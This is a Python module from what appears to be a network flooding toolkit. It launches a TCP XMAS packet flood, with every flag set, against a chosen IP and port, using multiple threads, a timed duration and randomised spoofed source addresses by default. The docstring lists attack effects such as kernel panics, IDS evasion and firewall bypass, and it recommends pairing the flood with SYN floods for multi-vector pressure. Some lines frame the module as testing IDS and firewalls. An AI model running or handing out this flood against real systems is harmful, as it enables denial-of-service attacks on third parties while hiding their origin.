"""
modules/xmas_flood.py - XMAS
TCP XMAS packet flood: all 8 flags set simultaneously.

How it works:
  A valid TCP segment uses specific flag combinations (SYN, ACK, FIN...).
  An XMAS packet sets ALL flags: FIN + SYN + RST + PSH + ACK + URG + ECE + CWR.
  This is illegal per RFC 793.

  Effects by target:
  - BSD/older Linux: may trigger RST storm or kernel panic (historic CVEs)
  - Windows: ignores or RSTs, negligible CPU
  - Cisco IOS: may log excessively, consume ACL cycles
  - IDS evasion: some NIDS skip stateful tracking of XMAS packets
  - Useful as a port scanner (closed ports reply RST, open ports drop silently)
    -> nmap -sX does exactly this

  Modern kernels: XMAS packets to closed ports = RST reply
                  XMAS packets to open ports  = silently dropped (no RST)

Attack value:
  - Useful for IDS/IPS evasion testing (do they alert on XMAS?)
  - Firewall rule bypass testing (stateless ACLs often miss XMAS)
  - Combined with SYN flood for multi-vector pressure
"""

from floodles.core.packet_builder import PacketBuilder
from floodles.core.sender import FloodEngine


def run(
    dst_ip: str,
    dst_port: int,
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
) -> FloodEngine:
    """
    Launch XMAS flood.

    Args:
        dst_ip    : Target IP.
        dst_port  : Target TCP port.
        threads   : Worker count.
        pps_limit : PPS cap.
        duration  : Duration in seconds.
        spoof     : Randomize source IP.

    Returns:
        FloodEngine (already started).
    """
    builder = PacketBuilder()

    def make_packet() -> bytes:
        return builder.xmas(dst_ip, dst_port, spoof=spoof)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
